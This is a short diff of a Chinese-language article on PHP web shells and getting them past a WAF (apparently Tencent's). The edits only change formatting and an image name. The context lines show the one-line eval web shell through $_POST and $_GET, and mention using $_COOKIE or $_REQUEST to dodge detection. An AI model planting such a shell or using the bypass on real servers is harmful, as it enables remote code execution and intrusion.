@@ -8,7 +8,7 @@
     <?php eval($_POST['test']); ?>
 ```
 
-  WebShell 的输入点在**$_GET** 和**$_POST** ,执行点在**eval()** ,经典的一句话WAF 都会拦截<br/>
+WebShell 的输入点在<b>$_GET</b> 和<b>$_POST</b> ,执行点在**eval()** ,经典的一句话WAF 都会拦截<br/>
 
   测试:`<?php eval($_GET['test']); ?>`
 
@@ -146,7 +146,7 @@ Payload:
 
   这样就可以绕过对$_GET ,$_POST 的检测,同样,还有$_REQUESTS ,$_COOKIE 
 
-![](pic/tencent-WAF-$_COOKIE.png)
+![](pic/tencent-WAF-$_COOKIE-bypass.png)
 
   
 
